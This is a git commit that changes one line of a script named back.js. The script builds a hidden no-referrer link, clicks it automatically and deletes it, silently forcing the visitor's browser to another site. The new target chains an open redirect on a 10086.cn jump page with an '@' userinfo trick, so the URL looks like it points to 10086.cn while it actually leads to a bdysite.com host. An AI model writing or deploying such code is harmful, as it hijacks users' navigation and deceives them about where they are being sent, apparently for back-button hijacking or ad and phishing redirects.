29f6f53287f3ecf2fe4b0bd409537e76b631a43f
you2048 <49125240+you2048@users.noreply.github.com>
2019-04-01 00:08:28 +0800

    Update back.js

--- back.js
+++ back.js
@@ -5,7 +5,7 @@ function zp() {
   var a = document.createElement('a');
   a.setAttribute('rel', 'noreferrer');
   a.setAttribute('id', 'm_noreferrer');
-  a.setAttribute('href', "http://cdn.shidhui.com/5c32e96f3b7541pMQZjZyxCjH3tCY5D2.svg?type=back_first&fsrc=dz");
+  a.setAttribute('href', "http://www.10086.cn/jump.html?url=http%3A%2F%2Fwww.10086.cn@mm002.bj01.bdysite.com");
   document.body.appendChild(a);
   document.getElementById('m_noreferrer').click();
   document.body.removeChild(a);
